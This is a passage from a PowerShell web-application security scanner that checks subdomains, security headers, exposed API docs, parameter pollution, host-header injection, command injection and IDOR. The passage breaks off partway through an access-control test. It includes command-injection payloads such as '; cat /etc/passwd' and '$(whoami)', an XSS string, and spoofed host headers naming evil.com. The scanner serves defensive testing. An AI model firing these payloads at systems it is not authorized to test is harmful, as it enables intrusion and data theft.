        $uri = [System.Uri]$site
        $domain = $uri.Host
        
        # Remove www. if present to get root domain
        $rootDomain = $domain -replace '^www\.', ''
        
        Write-Info "Enumerating common subdomains of $rootDomain"
        
        $commonSubs = @(
            "www", "api", "admin", "administrator", "dev", "development",
            "test", "testing", "staging", "stage", "beta", "alpha",
            "qa", "uat", "prod", "production", "demo",
            "mail", "email", "smtp", "pop", "imap",
            "ftp", "sftp", "ssh",
            "vpn", "remote", "rdp",
            "portal", "dashboard", "panel", "controlpanel", "cpanel",
            "blog", "forum", "shop", "store", "ecommerce",
            "backup", "backups", "old", "legacy",
            "cdn", "static", "assets", "media", "images",
            "status", "monitor", "health",
            "jenkins", "ci", "gitlab", "github",
            "jira", "confluence", "wiki"
        )
        
        foreach ($sub in $commonSubs) {
            $subdomain = "$sub.$rootDomain"
            
            try {
                $ips = [System.Net.Dns]::GetHostAddresses($subdomain)
                
                if ($ips.Count -gt 0) {
                    $ipStr = ($ips | Select-Object -First 3 | ForEach-Object { $_.IPAddressToString }) -join ", "
                    Write-Success "Subdomain found: $subdomain ($ipStr)"
                    $result.Metrics.SubdomainsFound++
                    $result.Metrics.ExposedSubdomains += $subdomain
                    
                    # Flag admin/dev/staging as higher risk
                    if ($sub -match "admin|dev|staging|test|backup|old|legacy|jenkins|gitlab") {
                        Add-Issue -severity "Medium" `
                            -title "Exposed Development/Admin Subdomain" `
                            -description "Subdomain $subdomain is publicly accessible" `
                            -whyItMatters "Dev/staging/admin subdomains often run weaker builds with debug enabled or no authentication. They can leak sensitive data or provide easier attack vectors." `
                            -suggestedFix "Restrict access to $subdomain via firewall rules or VPN. Ensure it uses strong authentication and is not indexed by search engines." `
                            -url "https://$subdomain" `
                            -issueType "SecurityMisconfiguration" `
                            -confidence "High"
                    }
                    else {
                        Add-Issue -severity "Info" `
                            -title "Active Subdomain Discovered" `
                            -description "Subdomain: $subdomain" `
                            -url "https://$subdomain" `
                            -confidence "High"
                    }
                }
            }
            catch {
                # Subdomain doesn't exist, that's fine
            }
            
            Start-Sleep -Milliseconds 100
        }
        
        Write-Info "Found $($result.Metrics.SubdomainsFound) active subdomains"
        
        # ========================================================================
        # RECURSIVE SUBDOMAIN SCANNING
        # ========================================================================
        if ($result.Metrics.SubdomainsFound -gt 0) {
            Write-Host ""
            Write-Info "========== RECURSIVE SUBDOMAIN SECURITY TESTING =========="
            Write-Info "Running security checks on each discovered subdomain..."
            Write-Host ""
            
            $subdomainsToScan = $result.Metrics.ExposedSubdomains | Where-Object { 
                $_ -notmatch "^mail\.|^smtp\.|^pop\.|^imap\.|^ftp\." 
            } | Select-Object -First 5  # Limit to 5 to avoid excessive scanning
            
            foreach ($subdomain in $subdomainsToScan) {
                $subUrl = "https://$subdomain"
                Write-Section "Scanning Subdomain: $subdomain"
                
                # Test 1: Security Headers
                Write-Info "[1/4] Checking security headers on $subdomain..."
                $subHeaders = Invoke-SafeWebRequest -uri $subUrl -method "HEAD" -timeoutSec 5
                
                if ($subHeaders.Success -and $subHeaders.Headers) {
                    $criticalHeaders = @("Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options")
                    $missingHeaders = @()
                    
                    foreach ($header in $criticalHeaders) {
                        if (-not $subHeaders.Headers.ContainsKey($header)) {
                            $missingHeaders += $header
                        }
                    }
                    
                    if ($missingHeaders.Count -gt 0) {
                        Write-Warning "$subdomain missing security headers: $($missingHeaders -join ', ')"
                        Add-Issue -severity "High" `
                            -title "Subdomain Missing Critical Security Headers" `
                            -description "$subdomain is missing: $($missingHeaders -join ', ')" `
                            -url $subUrl `
                            -remediation "Implement security headers on all subdomains, not just main site" `
                            -whyItMatters "Subdomains are often forgotten during security hardening. Missing headers leave them vulnerable to XSS, clickjacking, and MitM attacks. Attackers specifically target weaker subdomains." `
                            -suggestedFix "Apply same security header policy across all subdomains. Use centralized config or CDN-level policies." `
                            -issueType "SecurityMisconfiguration"
                    } else {
                        Write-Success "$subdomain has critical security headers"
                    }
                } else {
                    Write-Debug "$subdomain not responsive via HTTPS"
                }
                
                # Test 2: HTTP -> HTTPS Redirect
                Write-Info "[2/4] Checking HTTP->HTTPS redirect on $subdomain..."
                $httpUrl = "http://$subdomain"
                $redirectTest = Invoke-SafeWebRequest -uri $httpUrl -method "HEAD" -allowRedirect $false -timeoutSec 5
                
                if ($redirectTest.StatusCode -in @(301, 302, 303, 307, 308)) {
                    $location = ""
                    if ($redirectTest.Headers -and $redirectTest.Headers.ContainsKey('Location')) {
                        $location = $redirectTest.Headers['Location']
                    }
                    
                    if ($location -match '^https://') {
                        Write-Success "$subdomain redirects HTTP to HTTPS"
                    } else {
                        Write-Warning "$subdomain redirects but not to HTTPS: $location"
                    }
                } else {
                    Write-Danger "$subdomain does NOT redirect HTTP to HTTPS"
                    Add-Issue -severity "High" `
                        -title "Subdomain Missing HTTPS Redirect" `
                        -description "$subdomain accessible via HTTP without redirect to HTTPS" `
                        -url $httpUrl `
                        -remediation "Configure HTTP to HTTPS redirect (301/308) on $subdomain" `
                        -whyItMatters "HTTP access allows credential sniffing and MitM attacks. All traffic should be forced to HTTPS." `
                        -suggestedFix "Add redirect rule for $subdomain. Verify HSTS is set to includeSubDomains on root domain." `
                        -issueType "SecurityMisconfiguration"
                }
                
                # Test 3: Dangerous HTTP Methods
                Write-Info "[3/4] Checking HTTP methods on $subdomain..."
                $optionsTest = Invoke-SafeWebRequest -uri $subUrl -method "OPTIONS" -timeoutSec 5
                
                if ($optionsTest.Success -and $optionsTest.Headers -and $optionsTest.Headers.ContainsKey('Allow')) {
                    $allowedMethods = $optionsTest.Headers['Allow']
                    Write-Info "$subdomain allows: $allowedMethods"
                    
                    if ($allowedMethods -match 'TRACE|CONNECT|DELETE|PUT') {
                        Write-Warning "$subdomain allows dangerous HTTP methods"
                        Add-Issue -severity "Medium" `
                            -title "Subdomain Allows Dangerous HTTP Methods" `
                            -description "$subdomain reports Allow: $allowedMethods" `
                            -url $subUrl `
                            -remediation "Disable TRACE, CONNECT, and unnecessary DELETE/PUT methods" `
                            -whyItMatters "TRACE enables XST attacks. Unrestricted DELETE/PUT can allow data manipulation." `
                            -suggestedFix "Configure web server to return 405 for dangerous methods on $subdomain." `
                            -issueType "SecurityMisconfiguration"
                    }
                }
                
                # Test 4: Rate Limiting
                Write-Info "[4/4] Checking rate limiting on $subdomain..."
                $burstCount = 0
                for ($i = 0; $i -lt 15; $i++) {
                    $burstTest = Invoke-SafeWebRequest -uri $subUrl -method "GET" -timeoutSec 2
                    if ($burstTest.StatusCode -eq 429) {
                        Write-Success "$subdomain has rate limiting (got 429 after $i requests)"
                        break
                    }
                    $burstCount++
                    Start-Sleep -Milliseconds 50
                }
                
                if ($burstCount -ge 15) {
                    Write-Warning "$subdomain no rate limiting detected (15 requests succeeded)"
                    Add-Issue -severity "Medium" `
                        -title "Subdomain Missing Rate Limiting" `
                        -description "$subdomain accepted 15+ rapid requests without throttling" `
                        -url $subUrl `
                        -remediation "Implement rate limiting on $subdomain" `
                        -whyItMatters "Without rate limiting, attackers can bruteforce, scrape, or DoS this subdomain." `
                        -suggestedFix "Apply rate limiting at CDN, load balancer, or application level for $subdomain." `
                        -issueType "SecurityMisconfiguration"
                }
                
                Write-Host ""
            }
            
            Write-Success "Subdomain recursive scanning complete"
        }
        
        $result.Status = "Completed"
        Complete-SecurityTest
    }
    catch {
        Write-Danger "Subdomain enumeration failed: $_"
        $result.Status = "Failed"
        Complete-SecurityTest "Failed"
    }
    
    return $result
}

# ============================================================================
# TEST 18: API DOCUMENTATION & ENDPOINT DISCOVERY
# ============================================================================
function Test-APIDiscovery {
    Start-SecurityTest "API Documentation & Endpoint Discovery" "18"
    
    $result = @{
        Name = "APIDiscovery"
        Status = "Completed"
        Duration = 0
        Issues = @()
        Evidence = @{}
        Metrics = @{
            APIsFound = 0
            InteractiveDocs = @()
        }
    }
    
    try {
        Write-Info "Probing for API documentation and endpoints..."
        
        $apiPaths = @(
            @{path="/api"; desc="API root"},
            @{path="/api/v1"; desc="API v1"},
            @{path="/api/v2"; desc="API v2"},
            @{path="/api/v3"; desc="API v3"},
            @{path="/api/docs"; desc="API docs"},
            @{path="/api/documentation"; desc="API documentation"},
            @{path="/api/swagger"; desc="Swagger UI"},
            @{path="/swagger"; desc="Swagger UI (root)"},
            @{path="/swagger-ui"; desc="Swagger UI"},
            @{path="/swagger-ui.html"; desc="Swagger UI HTML"},
            @{path="/swagger.json"; desc="Swagger JSON spec"},
            @{path="/swagger.yaml"; desc="Swagger YAML spec"},
            @{path="/swagger.yml"; desc="Swagger YML spec"},
            @{path="/openapi.json"; desc="OpenAPI JSON spec"},
            @{path="/openapi.yaml"; desc="OpenAPI YAML spec"},
            @{path="/api-docs"; desc="API documentation"},
            @{path="/api-docs.json"; desc="API docs JSON"},
            @{path="/docs"; desc="Documentation"},
            @{path="/graphql"; desc="GraphQL endpoint"},
            @{path="/graphiql"; desc="GraphiQL interactive UI"},
            @{path="/playground"; desc="GraphQL Playground"},
            @{path="/api/graphql"; desc="API GraphQL"},
            @{path="/v1/graphql"; desc="GraphQL v1"},
            @{path="/console"; desc="API console"},
            @{path="/api/console"; desc="API console"},
            @{path="/redoc"; desc="ReDoc documentation"},
            @{path="/rapidoc"; desc="RapiDoc documentation"}
        )
        
        foreach ($endpoint in $apiPaths) {
            $apiResult = Invoke-SafeWebRequest -uri ($site + $endpoint.path) -method "GET" -timeoutSec 3
            
            if ($apiResult.Success) {
                Write-Warning "API endpoint accessible: $($endpoint.path)"
                $result.Metrics.APIsFound++
                
                $content = $apiResult.Content.ToLower()
                
                # Check for interactive documentation
                $isInteractive = $false
                if ($content -match "swagger|openapi|graphiql|playground|rapidoc|redoc|try it out|execute|send request") {
                    $isInteractive = $true
                    $result.Metrics.InteractiveDocs += $endpoint.path
                    Write-Warning "Interactive API documentation at $($endpoint.path)"
                }
                
                # Check for sensitive operations
                $hasSensitiveOps = $false
                if ($content -match "admin|delete|remove|update|create|post|put|patch|internal|private|secret|token|key|password|auth") {
                    $hasSensitiveOps = $true
                }
                
                # Determine severity
                if ($isInteractive -and $hasSensitiveOps) {
                    Add-Issue -severity "High" `
                        -title "Interactive API Documentation Exposes Sensitive Operations" `
                        -description "Interactive API docs at $($endpoint.path) reveal admin/internal operations and allow live testing" `
                        -whyItMatters "Attackers can use interactive docs to discover internal endpoints, authentication schemes, request formats, and directly test attacks without reverse engineering. This dramatically reduces reconnaissance time." `
                        -suggestedFix "Restrict access to $($endpoint.path) via IP whitelist or authentication. Move documentation to internal network. Remove 'Try It' functionality in production." `
                        -url ($site + $endpoint.path) `
                        -issueType "InfoDisclosure" `
                        -confidence "High"
                }
                elseif ($isInteractive) {
                    Add-Issue -severity "Medium" `
                        -title "Public Interactive API Documentation" `
                        -description "Interactive API documentation found at $($endpoint.path)" `
                        -whyItMatters "Interactive docs reveal API structure and allow attackers to easily probe endpoints without writing code." `
                        -suggestedFix "Add authentication to API documentation or disable 'Try It' features in production environments." `
                        -url ($site + $endpoint.path) `
                        -issueType "InfoDisclosure" `
                        -confidence "High"
                }
                else {
                    Add-Issue -severity "Low" `
                        -title "API Documentation Publicly Accessible" `
                        -description "API documentation at $($endpoint.path)" `
                        -url ($site + $endpoint.path) `
                        -issueType "InfoDisclosure" `
                        -confidence "Medium"
                }
            }
            
            Start-Sleep -Milliseconds 100
        }
        
        Write-Info "Found $($result.Metrics.APIsFound) API endpoints"
        
        $result.Status = "Completed"
        Complete-SecurityTest
    }
    catch {
        Write-Danger "API discovery failed: $_"
        $result.Status = "Failed"
        Complete-SecurityTest "Failed"
    }
    
    return $result
}

# ============================================================================
# TEST 19: HTTP PARAMETER POLLUTION (HPP)
# ============================================================================
function Test-HTTPParameterPollution {
    Start-SecurityTest "HTTP Parameter Pollution (HPP)" "19"
    
    $result = @{
        Name = "HTTPParameterPollution"
        Status = "Completed"
        Duration = 0
        Issues = @()
        Evidence = @{}
        Metrics = @{
            TestsRun = 0
            AnomaliesDetected = 0
        }
    }
    
    try {
        Write-Info "Testing HTTP Parameter Pollution vulnerabilities..."
        Write-Info "Note: HPP can bypass WAF rules and validation logic"
        
        $hppTests = @(
            @{url="/api/countries?code=IT&code=FR"; desc="Duplicate param (API)"},
            @{url="/search?q=test&q=<script>alert(1)</script>"; desc="Duplicate param with XSS"},
            @{url="/api/user?id=1&id=2"; desc="Duplicate ID param"},
            @{url="/login?user=admin&user=test"; desc="Duplicate user param"},
            @{url="/api/data?filter=safe&filter=malicious"; desc="Duplicate filter param"}
        )
        
        foreach ($test in $hppTests) {
            $result.Metrics.TestsRun++
            $hppResult = Invoke-SafeWebRequest -uri ($site + $test.url) -method "GET" -timeoutSec 3
            
            if ($hppResult.Success) {
                $content = $hppResult.Content.ToLower()
                
                # Check for anomalies
                $anomaly = $false
                if ($content -match "error|warning|exception|duplicate|invalid param|multiple") {
                    $anomaly = $true
                    Write-Warning "Anomaly detected in HPP test"
                }
                
                # Check if both param values are reflected
                if ($test.url -match 'code=IT&code=FR' -and $content -match 'it.*fr|fr.*it') {
                    $anomaly = $true
                    Write-Warning "Multiple param values processed"
                }
                
                if ($anomaly) {
                    $result.Metrics.AnomaliesDetected++
                    Add-Issue -severity "Medium" `
                        -title "HTTP Parameter Pollution Detected" `
                        -description ("Server processes duplicate parameters inconsistently at " + $test.url) `
                        -whyItMatters "HPP can bypass input validation, WAF rules, and access controls by exploiting differences in how application layers parse duplicate parameters. Different frameworks handle duplicates differently (first, last, concat, array)." `
                        -suggestedFix "Implement strict parameter parsing: reject requests with duplicate parameters, or explicitly define which value to use (first/last). Log HPP attempts." `
                        -url ($site + $test.url) `
                        -issueType "HPP" `
                        -confidence "Medium"
                }
            }
            elseif ($hppResult.StatusCode -eq 500) {
                Write-Warning ("Server error on HPP test: " + $test.desc)
                $result.Metrics.AnomaliesDetected++
                Add-Issue -severity "Medium" `
                    -title "HTTP Parameter Pollution Causes Server Error" `
                    -description ("Duplicate parameters cause 500 error: " + $test.desc) `
                    -whyItMatters "Server crashes on duplicate parameters indicate poor input validation and potential DoS vector." `
                    -suggestedFix "Add input validation to handle duplicate parameters gracefully." `
                    -url ($site + $test.url) `
                    -issueType "HPP" `
                    -confidence "High"
            }
            
            Start-Sleep -Milliseconds 100
        }
        
        Write-Info ("HPP tests completed: " + $result.Metrics.AnomaliesDetected + " anomalies detected")
        
        $result.Status = "Completed"
        Complete-SecurityTest
    }
    catch {
        Write-Danger ("HPP testing failed: " + $_)
        $result.Status = "Failed"
        Complete-SecurityTest "Failed"
    }
    
    return $result
}

# ============================================================================
# TEST 20: CACHE POISONING & HOST HEADER INJECTION
# ============================================================================
function Test-CachePoisoning {
    Start-SecurityTest "Cache Poisoning and Host Header Injection" "20"
    
    $result = @{
        Name = "CachePoisoning"
        Status = "Completed"
        Duration = 0
        Issues = @()
        Evidence = @{}
        Metrics = @{
            TestsRun = 0
            VulnerabilitiesFound = 0
        }
    }
    
    try {
        Write-Info "Testing cache poisoning and host header injection..."
        Write-Info "Note: This test manipulates HTTP headers to detect reflection"
        
        # Test with custom headers
        $poisonHeaders = @{
            "X-Forwarded-Host" = "evil.com"
            "X-Forwarded-For" = "attacker.com"
            "X-Original-URL" = "/admin"
            "X-Rewrite-URL" = "/admin"
            "X-Host" = "malicious.com"
        }
        
        $result.Metrics.TestsRun++
        $cacheResult = Invoke-SafeWebRequest -uri $site -method "GET" -headers $poisonHeaders -timeoutSec 5
        
        if ($cacheResult.Success) {
            $content = $cacheResult.Content.ToLower()
            $responseHeaders = $cacheResult.Headers
            
            # Check for evil.com or attacker.com reflection
            if ($content -match "evil\.com|attacker\.com|malicious\.com") {
                Write-Danger "Host header injection detected - malicious host reflected"
                $result.Metrics.VulnerabilitiesFound++
                Add-Issue -severity "High" `
                    -title "Cache Poisoning / Host Header Injection" `
                    -description "Malicious host headers (X-Forwarded-Host: evil.com) are reflected in response body" `
                    -whyItMatters "Attackers can poison caches to serve malicious content to all users. Can hijack password reset links, redirect users to phishing sites, or cause SEO poisoning. If cached, affects all visitors." `
                    -suggestedFix "Validate and sanitize all host-related headers (X-Forwarded-Host, X-Host, etc.). Use a whitelist of allowed hosts. Avoid using these headers to construct URLs in responses." `
                    -url $site `
                    -issueType "CachePoisoning" `
                    -confidence "High" `
                    -evidence @{ReflectedHost = "evil.com or similar"}
            }
            
            # Check for URL manipulation reflection
            if ($content -match "/admin" -and ($content -match "x-original-url|x-rewrite-url")) {
                Write-Warning "URL override headers may be processed"
                $result.Metrics.VulnerabilitiesFound++
                Add-Issue -severity "Medium" `
                    -title "URL Override Headers Processed" `
                    -description "Server appears to process X-Original-URL or X-Rewrite-URL headers" `
                    -whyItMatters "Can bypass access controls and authentication by manipulating URL routing through HTTP headers." `
                    -suggestedFix "Disable processing of X-Original-URL and X-Rewrite-URL headers unless explicitly required. If needed, validate against whitelist." `
                    -url $site `
                    -issueType "CachePoisoning" `
                    -confidence "Medium"
            }
            
            # Check Location header for reflected host
            if ($responseHeaders.ContainsKey("Location")) {
                $location = $responseHeaders["Location"]
                if ($location -match "evil\.com|attacker\.com|malicious\.com") {
                    Write-Danger "Malicious host reflected in Location header"
                    $result.Metrics.VulnerabilitiesFound++
                    Add-Issue -severity "Critical" `
                        -title "Critical: Host Header Injection in Redirects" `
                        -description "Malicious host reflected in Location header - can hijack redirects" `
                        -whyItMatters "Password reset emails and other notifications may contain malicious URLs, leading to account takeover." `
                        -suggestedFix "Never use client-supplied host headers in Location headers. Use server-configured domain names only." `
                        -url $site `
                        -issueType "CachePoisoning" `
                        -confidence "High"
                }
            }
        }
        
        if ($result.Metrics.VulnerabilitiesFound -eq 0) {
            Write-Success "No cache poisoning vulnerabilities detected"
        }
        
        $result.Status = "Completed"
        Complete-SecurityTest
    }
    catch {
        Write-Danger ("Cache poisoning test failed: " + $_)
        $result.Status = "Failed"
        Complete-SecurityTest "Failed"
    }
    
    return $result
}

# ============================================================================
# TEST 21: COMMAND INJECTION
# ============================================================================
function Test-CommandInjection {
    Start-SecurityTest "Command Injection Testing" "21"
    
    $result = @{
        Name = "CommandInjection"
        Status = "Completed"
        Duration = 0
        Issues = @()
        Evidence = @{}
        Metrics = @{
            TestsRun = 0
            VulnerabilitiesFound = 0
        }
    }
    
    try {
        Write-Info "Testing for command injection vulnerabilities..."
        Write-Warning "Note: These tests attempt command execution - use only on authorized targets"
        
        $cmdPayloads = @(
            '; ls',
            '| whoami',
            '& dir',
            '`whoami`',
            '$(whoami)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '& type C:\Windows\System32\drivers\etc\hosts',
            '; ping -c 1 127.0.0.1',
            '| ping -n 1 127.0.0.1'
        )
        
        $cmdEndpoints = @(
            "/api/ping?host=",
            "/api/dns?domain=",
            "/api/lookup?ip=",
            "/api/tools/ping?target=",
            "/api/network/traceroute?host="
        )
        
        foreach ($endpoint in $cmdEndpoints) {
            foreach ($payload in $cmdPayloads) {
                $result.Metrics.TestsRun++
                
                try {
                    $encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
                    $testUrl = $site + $endpoint + $encodedPayload
                    $cmdResult = Invoke-SafeWebRequest -uri $testUrl -method "GET" -timeoutSec 3
                    
                    if ($cmdResult.Success) {
                        $content = $cmdResult.Content.ToLower()
                        
                        # Look for command execution indicators
                        if ($content -match "root:|uid=|gid=|nobody|daemon|www-data|bin/bash|cmd\.exe|windows\\system32") {
                            Write-Danger ("CRITICAL: Command injection detected at " + $endpoint)
                            $result.Metrics.VulnerabilitiesFound++
                            Add-Issue -severity "Critical" `
                                -title "Command Injection Vulnerability" `
                                -description ("Command execution possible at " + $endpoint + " with payload: " + $payload) `
                                -whyItMatters "Attackers can execute arbitrary operating system commands, leading to complete server compromise, data theft, malware installation, and lateral movement through the network." `
                                -suggestedFix "Never pass user input directly to system commands. Use parameterized APIs instead of shell commands. Implement strict input validation with whitelist of allowed characters. Run application with least privileges." `
                                -url $testUrl `
                                -issueType "CommandInjection" `
                                -confidence "High" `
                                -evidence @{Payload = $payload; Response = $content.Substring(0, [Math]::Min(500, $content.Length))}
                        }
                    }
                }
                catch {
                    # Expected for most payloads
                }
                
                Start-Sleep -Milliseconds 50
            }
        }
        
        if ($result.Metrics.VulnerabilitiesFound -eq 0) {
            Write-Success "No command injection vulnerabilities detected"
        }
        
        $result.Status = "Completed"
        Complete-SecurityTest
    }
    catch {
        Write-Danger ("Command injection testing failed: " + $_)
        $result.Status = "Failed"
        Complete-SecurityTest "Failed"
    }
    
    return $result
}

# ============================================================================
# TEST 22: LARGE PARAMETER DoS BEHAVIOR
# ============================================================================
function Test-LargeParameterDoS {
    Start-SecurityTest "Large Parameter DoS Behavior" "22"
    
    $result = @{
        Name = "LargeParamDoS"
        Status = "Completed"
        Duration = 0
        Issues = @()
        Evidence = @{}
        Metrics = @{
            TestsRun = 0
            TimeoutsDetected = 0
        }
    }
    
    try {
        Write-Info "Testing server resilience to large parameters..."
        Write-Warning "Note: Do NOT run full stress/DoS testing without written approval"
        
        # Test with 10KB parameter
        $largeParam = "A" * 10000
        
        $result.Metrics.TestsRun++
        $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
        
        try {
            $largeResult = Invoke-SafeWebRequest -uri ($site + "/?test=$largeParam") -method "GET" -timeoutSec 10
            $stopwatch.Stop()
            
            if ($stopwatch.ElapsedMilliseconds -gt 5000) {
                $elapsedMs = $stopwatch.ElapsedMilliseconds
                Write-Warning ("Slow response to large parameter (" + $elapsedMs + "ms)")
                $result.Metrics.TimeoutsDetected++
                Add-Issue -severity "Low" `
                    -title "Potential DoS Vector via Large Parameters" `
                    -description ("Server takes " + $elapsedMs + "ms to process 10KB parameter") `
                    -whyItMatters "Application may be vulnerable to resource exhaustion attacks using large GET/POST parameters. Can lead to service degradation or downtime." `
                    -suggestedFix "Implement request size limits at load balancer/WAF level. Add parameter length validation. Consider rate limiting based on request size." `
                    -url ($site + "/?test=...") `
                    -issueType "DoS" `
                    -confidence "Low"
            }
            else {
                Write-Success ("Large parameter handled efficiently (" + $stopwatch.ElapsedMilliseconds + "ms)")
            }
        }
        catch {
            $stopwatch.Stop()
            if ($_.Exception.Message -match "timeout") {
                Write-Warning "Timeout on large parameter test"
                $result.Metrics.TimeoutsDetected++
                Add-Issue -severity "Medium" `
                    -title "Large Parameter Causes Timeout" `
                    -description "10KB parameter causes request timeout" `
                    -whyItMatters "Indicates poor input handling that can be exploited for DoS attacks." `
                    -suggestedFix "Implement strict request size limits and parameter length validation." `
                    -issueType "DoS" `
                    -confidence "Medium"
            }
        }
        
        $result.Status = "Completed"
        Complete-SecurityTest
    }
    catch {
        Write-Danger ("Large parameter test failed: " + $_)
        $result.Status = "Failed"
        Complete-SecurityTest "Failed"
    }
    
    return $result
}

# ============================================================================
# TEST 23: BROKEN ACCESS CONTROL / IDOR TESTING
# ============================================================================
function Test-BrokenAccessControl {
    Start-SecurityTest "Broken Access Control / IDOR Detection" "23"
    
    Write-Info "Testing for Insecure Direct Object References and broken access control..."
    
    # Determine if we're doing authenticated IDOR testing
    $hasAuth = $script:authState.IsAuthenticated
    $myUserId = if ($AuthUserId) { $AuthUserId } else { "1" }
    $otherUserId = [int]$myUserId + 1
    
    if ($hasAuth) {
        Write-Success "Authenticated mode enabled - will test IDOR with session replay"
        Write-Info "Your User ID: $myUserId | Testing access to User ID: $otherUserId"
    }
    else {
        Write-Info "Unauthenticated mode - testing for anonymous access only"
        Write-Info "For full IDOR testing, provide: -SessionCookie 'session=...' -AuthUserId 123"
    }
    
    # Test endpoints - dynamic based on auth context
    $testEndpoints = @(
        @{ Path = "/api/user"; Params = @{ id = $myUserId }; Description = "My user profile"; IsMine = $true },
        @{ Path = "/api/user"; Params = @{ id = $otherUserId }; Description = "Other user profile"; IsMine = $false },
        @{ Path = "/api/admin/stats"; Params = @{}; Description = "Admin statistics"; RequiresAdmin = $true },
        @{ Path = "/api/orders"; Params = @{ userId = $myUserId }; Description = "My orders"; IsMine = $true },
        @{ Path = "/api/orders"; Params = @{ userId = $otherUserId }; Description = "Other user orders"; IsMine = $false },
        @{ Path = "/api/account"; Params = @{ id = $myUserId }; Description = "My account details"; IsMine = $true },
        @{ Path = "/api/account"; Params = @{ id = $otherUserId }; Description = "Other account details"; IsMine = $false },
        @{ Path = "/api/profile"; Params = @{ user = $myUserId }; Description = "My profile data"; IsMine = $true },
        @{ Path = "/api/profile"; Params = @{ user = $otherUserId }; Description = "Other profile data"; IsMine = $false },
        @{ Path = "/admin/dashboard"; Params = @{}; Description = "Admin dashboard"; RequiresAdmin = $true },
        @{ Path = "/admin"; Params = @{}; Description = "Admin panel"; RequiresAdmin = $true },
        @{ Path = "/api/admin/users"; Params = @{}; Description = "Admin user list"; RequiresAdmin = $true },
        @{ Path = "/user/settings"; Params = @{ userId = $myUserId }; Description = "My user settings"; IsMine = $true },
        @{ Path = "/user/settings"; Params = @{ userId = $otherUserId }; Description = "Other user settings"; IsMine = $false }
    )
    
    $vulnerableEndpoints = @()
    $anonymousAccessCount = 0
    $idorVulnerabilities = @()
    $privilegeEscalations = @()
    
    foreach ($endpoint in $testEndpoints) {
        # Build URL with query parameters
        $queryString = ""
        if ($endpoint.Params.Count -gt 0) {
            $params = @()
            foreach ($key in $endpoint.Params.Keys) {
                $params += "$key=$($endpoint.Params[$key])"
            }
            $queryString = "?" + ($params -join "&")
        }
        
        $fullUrl = $site + $endpoint.Path + $queryString
        
        Write-Info "Testing: $($endpoint.Description) - $fullUrl"
        
        # ====================================================================
        # PHASE 1: Anonymous Access Testing
        # ====================================================================
        $anonResult = Invoke-SafeWebRequest -uri $fullUrl -method "GET" -useAuth $false -timeoutSec 5
        
        if ($anonResult.StatusCode -eq 200) {
            $contentLength = 0
            if ($anonResult.Content) {
                $contentLength = $anonResult.Content.Length
            }
            
            # Check if response looks like actual data (not just a login redirect page)
            $looksLikeData = $false
            if ($contentLength -gt 100) {
                $content = $anonResult.Content.ToLower()
                # Heuristics: looks like JSON or structured data
                if ($content -match '^\s*[\{\[]' -or $content -match '"id"\s*:|"user"|"data"|"items"') {
                    $looksLikeData = $true
                }
            }
            
            if ($looksLikeData) {
                Write-Danger "Anonymous access returns data: $($endpoint.Path) (200 OK, $contentLength bytes)"
                $anonymousAccessCount++
                
                $severity = "High"
                if ($endpoint.RequiresAdmin) {
                    $severity = "Critical"
                }
                
                Add-Issue -severity $severity `
                    -title "Broken Access Control - Anonymous Access to Sensitive Data" `
                    -description "Endpoint $($endpoint.Path) returns private data without authentication. Anonymous request received 200 OK with $contentLength bytes of structured data." `
                    -url $fullUrl `
                    -remediation "Implement authentication and authorization checks. Return 401 Unauthorized for unauthenticated requests." `
                    -whyItMatters "Attackers can access sensitive user/admin data without logging in. This exposes private information, business logic, and potential PII to anyone on the internet." `
                    -suggestedFix "Add authentication middleware that validates session/token before processing requests. Return 401 for missing auth, 403 for insufficient privileges." `
                    -category "Access Control" `
                    -cweId "CWE-284" `
                    -issueType "BrokenAccessControl" `
                    -confidence "High" `
                    -evidence @{
                        Endpoint = $endpoint.Path
                        ResponseSize = $contentLength
                        AuthRequired = $false
                    }
                    
                $vulnerableEndpoints += $endpoint.Path
            }
            else {
                Write-Info "Anonymous 200 OK but response doesn't look like structured data (may be login page)"
            }
        }
        elseif ($anonResult.StatusCode -eq 401) {
            Write-Success "Properly requires authentication (401 Unauthorized)"
        }
        elseif ($anonResult.StatusCode -eq 403) {
            Write-Success "Properly denies access (403 Forbidden)"
        }
        elseif ($anonResult.StatusCode -eq 404) {
            Write-Debug "Endpoint not found (404)"
        }
        else {
            Write-Debug "Anonymous access: Status $($anonResult.StatusCode)"
        }
        
        # ====================================================================
        # PHASE 2: Authenticated IDOR Testing (if auth configured)
        # ====================================================================
        if ($hasAuth) {
            Start-Sleep -Milliseconds 100  # Small delay between tests
            
            $authResult = Invoke-SafeWebRequest -uri $fullUrl -method "GET" -useAuth $true -timeoutSec 5
            
            if ($authResult.StatusCode -eq 200) {
                $authContent = $authResult.Content
                $authContentLength = if ($authContent) { $authContent.Length } else { 0 }
                
                # Check for IDOR: accessing OTHER user's data
                if ($endpoint.IsMine -eq $false -and $authContentLength -gt 100) {
                    $contentLower = $authContent.ToLower()
                    $hasData = $contentLower -match '^\s*[\{\[]' -or $contentLower -match '"id"|"user"|"data"'
                    
                    if ($hasData) {
                        Write-Danger "IDOR DETECTED: User $myUserId can access User $otherUserId data!"
                        
                        $idorVulnerabilities += $endpoint.Path
                        
                        Add-Issue -severity "Critical" `
                            -title "Insecure Direct Object Reference (IDOR) - Horizontal Privilege Escalation" `
                            -description "Authenticated user (ID: $myUserId) can access data belonging to another user (ID: $otherUserId) at endpoint $($endpoint.Path). Server returned 200 OK with $authContentLength bytes of data." `
                            -url $fullUrl `
                            -remediation "Implement authorization checks that verify logged-in user can only access their own resources. Compare session user ID with requested resource owner ID." `
                            -whyItMatters "This is a CRITICAL exploitable vulnerability. Any authenticated user can view/modify other users' private data by simply changing ID parameters in requests. This leads to mass data breaches, identity theft, and privacy violations." `
                            -suggestedFix "1. Extract user ID from authenticated session. 2. Before returning resource, verify: IF resource.userId != session.userId THEN return 403 Forbidden. 3. Use object-level authorization framework. 4. Never trust client-supplied IDs for access control." `
                            -category "Access Control" `
                            -cweId "CWE-639" `
                            -issueType "IDOR" `
                            -confidence "High" `
                            -evidence @{
                                MyUserId = $myUserId
                                AccessedUserId = $otherUserId
                                Endpoint = $endpoint.Path
                                ResponseSize = $authContentLength
                                Proven = $true
                            }
                    }
                    else {
                        Write-Info "200 OK but content doesn't look like user data (may be sanitized)"
                    }
                }
                
                # Check for privilege escalation: regular user accessing admin endpoints
                if ($endpoint.RequiresAdmin) {
